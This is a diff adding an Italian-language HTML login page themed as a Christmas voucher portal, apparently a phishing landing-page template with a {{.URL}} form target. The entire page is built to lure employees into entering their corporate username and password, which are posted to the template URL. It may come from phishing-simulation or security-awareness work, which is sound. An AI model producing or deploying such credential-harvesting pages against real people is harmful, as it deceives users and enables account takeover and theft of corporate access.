@@ -1,0 +1,113 @@
+ <!DOCTYPE html>
+ <html lang="it">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Accesso Voucher Natalizio</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+  body {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  margin: 0;
+  height: 100vh;
+  overflow: hidden;
+  }
+
+  .background {
+  background: url('background.jpg') no-repeat center center fixed;
+  background-size: cover;
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  filter: blur(5px);
+  z-index: -1;
+  }
+
+  .login-container {
+  background-color: white;
+  padding: 40px;
+  border-radius: 10px;
+  box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+  width: 400px;
+  text-align: center;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  }
+
+  .login-container h2 {
+  color: #333;
+  margin-bottom: 30px;
+  font-size: 2em;
+  }
+
+  .form-group {
+  position: relative;
+  margin-bottom: 25px;
+  }
+
+  .form-group i {
+  position: absolute;
+  top: 50%;
+  left: 10px;
+  transform: translateY(-50%);
+  color: #888;
+  }
+
+  .form-group input {
+  width: 100%;
+  padding: 12px 40px;
+  border: 1px solid #ddd;
+  border-radius: 5px;
+  box-sizing: border-box;
+  font-size: 1em;
+  }
+
+  button {
+  background-color: #007bff;
+  color: white;
+  padding: 12px 20px;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  width: 100%;
+  font-size: 1.1em;
+  margin-bottom: 20px;
+  }
+
+  button:hover {
+  background-color: #0056b3;
+  }
+
+  .forgot-password {
+  color: #007bff;
+  font-size: 0.9em;
+  }
+
+  .forgot-password:hover {
+  text-decoration: underline;
+  }
+  </style>
+ </head>
+ <body>
+  <div class="background"></div>
+  <div class="login-container">
+  <h2>Accedi</h2>
+  <form action="{{.URL}}" method="post">
+  <div class="form-group">
+  <i class="fas fa-user"></i>
+  <input type="text" id="username" name="username" placeholder="Username Aziendale" required>
+  </div>
+  <div class="form-group">
+  <i class="fas fa-lock"></i>
+  <input type="password" id="password" name="password" placeholder="Password Aziendale" required>
+  </div>
+  <button type="submit">Accedi</button>
+  <a href="#" class="forgot-password">Password dimenticata?</a>
+  </form>
+  </div>
+ </body>
+ </html>
